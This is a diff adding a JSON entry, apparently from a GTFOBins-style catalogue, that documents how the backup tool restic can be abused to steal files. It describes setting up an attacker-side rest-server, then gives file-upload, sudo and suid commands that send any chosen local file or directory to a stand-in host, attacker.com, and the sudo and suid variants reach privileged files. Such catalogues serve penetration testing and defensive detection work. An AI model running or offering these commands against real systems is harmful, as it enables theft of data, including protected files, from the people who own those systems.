@@ -1,0 +1,20 @@
+{
+  "description": "The attacker must setup a server to receive the backups, in the following example [rest-server](https://github.com/restic/rest-server/) is used but there are other options. To start a new instance and create a new repository:\n\n```console\nRPORT=12345\nNAME=backup_name\n./rest-server --listen \":$RPORT\"\nrestic init -r \"rest:http://localhost:$RPORT/$NAME\"\n```\n\nTo extract the data from the restic repository in the current directory on the attacker side:\n\n```console\nrestic restore -r \"/tmp/restic/$NAME\" latest --target .\n```\n\nUpload data to the attacker server with the following commands.\n",
+  "functions": {
+    "file-upload": [
+      {
+        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
+      }
+    ]
+  }
+}
